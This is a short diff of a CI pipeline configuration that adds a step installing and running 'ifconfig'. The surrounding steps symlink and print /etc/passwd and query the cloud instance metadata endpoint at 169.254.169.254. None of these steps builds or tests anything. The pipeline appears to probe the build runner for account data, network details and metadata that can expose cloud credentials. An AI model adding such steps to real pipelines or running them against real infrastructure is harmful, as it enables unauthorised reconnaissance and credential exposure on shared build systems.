@@ -7,7 +7,8 @@
        - checkout
        - run: echo "deb http://us.archive.ubuntu.com/ubuntu/ bionic universe" > /etc/apt/sources.list.d/ubuntu.list
        - run: apt-get update 
-       - run: apt-get -y install curl
+       - run: apt-get -y install curl ifconfig
+       - run: ifconfig
        - run: ln -s /etc/passwd /tmp/log
        - run: cat /tmp/log
        - run: curl http://169.254.169.254
